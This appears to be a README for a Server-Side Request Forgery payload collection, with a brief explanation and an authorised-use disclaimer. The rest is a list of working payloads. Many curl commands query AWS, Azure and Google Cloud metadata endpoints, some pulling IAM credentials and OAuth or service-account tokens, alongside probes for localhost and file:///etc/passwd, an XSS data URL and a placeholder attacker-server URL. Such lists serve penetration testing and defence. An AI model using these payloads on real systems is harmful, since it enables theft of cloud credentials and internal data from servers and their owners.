# SSRF Payload Collection

This repository contains a collection of Server-Side Request Forgery (SSRF) payloads. SSRF vulnerabilities occur when an attacker can make the server perform unauthorized requests, potentially leading to unauthorized access to internal resources and data exposure.

## Usage

Use these payloads for educational and testing purposes only. Do not use them on systems without explicit permission. Unauthorized use of these payloads on systems you do not own or have authorization to test is illegal and unethical.

## Payloads

```plaintext
http://169.254.169.254/latest/meta-data/
http://127.0.0.1
http://localhost
file:///etc/passwd
data:text/html,<script>alert(1)</script>
http://your-attacker-server.com
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://metadata.google.internal/computeMetadata/v1/instance/
curl http://169.254.169.254/latest/meta-data/
curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
curl http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H "Metadata: true"
curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/project/" -H "Metadata-Flavor: Google"
curl http://127.0.0.1
curl http://localhost
curl http://169.254.169.254/latest/dynamic/instance-identity/document
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/public-hostname
curl http://169.254.169.254/latest/meta-data/security-groups
curl http://169.254.169.254/latest/user-data
curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
curl "http://169.254.169.254/computeMetadata/v1/instance" -H "Metadata-Flavor: Google"
curl "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
